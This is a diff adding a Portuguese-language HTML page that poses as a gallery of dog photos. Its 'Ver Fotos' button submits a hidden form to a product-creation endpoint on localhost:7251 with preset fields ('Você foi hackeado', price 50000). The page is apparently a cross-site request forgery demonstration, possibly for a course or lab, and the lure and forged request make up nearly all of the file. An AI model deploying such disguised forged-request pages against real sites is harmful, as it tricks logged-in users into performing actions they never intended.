@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Veja Fotos de Lindos Cachorros!</title>
+    <style>
+        body {
+            background-color: #f7f7f7;
+            font-family: Arial, sans-serif;
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            width: 80%;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        .button {
+            background-color: #f7a72b;
+            color: white;
+            padding: 15px 25px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 20px 0;
+            cursor: pointer;
+            border-radius: 8px;
+            border: none;
+        }
+        .button:hover {
+            background-color: #e8961e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Olá Amante de Cachorros!</h1>
+        <p>Preparamos uma coleção de fotos de lindos cachorros só para você. Clique no botão abaixo para ver estas belezinhas!</p>
+        
+        <form action="https://localhost:7251/meus-produtos/criar-novo" method="post">
+            <input type="hidden" name="Nome" value="Você foi hackeado" />
+            <input type="hidden" name="Valor" value="50000" />
+            <input type="hidden" name="Imagem" value="Hacker-PNG-Photo-Image.png" />
+            <input type="submit" class="button" value="Ver Fotos" />
+        </form>
+        
+        <p>Obrigado por fazer parte da nossa comunidade canina!</p>
+    </div>
+</body>
+</html>
